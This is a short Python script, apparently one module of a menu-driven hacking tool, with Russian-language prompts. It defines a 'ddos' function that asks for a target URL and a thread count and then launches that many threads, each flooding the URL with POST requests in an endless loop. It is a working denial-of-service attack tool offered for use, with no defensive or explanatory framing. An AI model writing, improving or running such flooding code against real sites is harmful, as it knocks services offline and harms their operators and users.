import requests
from threading import Thread

from colorama import init, Fore

import main

from time import sleep


def ddos():
	init()
	url = input('\n' + '\033[1m' + 'Ссылка: ')
	thrnom = input('\033[1m' + 'Количество потоков: ')

	def spam1():
			while True:
				spam = requests.post(url)

	try:
		spam2 = requests.get(url)

		print('Атака началась...')
		for i in range(int(thrnom)):
			thr = Thread(target=spam1)
			thr.start()
		print('Атака окончена, отправляю на главный экран')

	except Exception:
		print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

	sleep(3)
	main.main()
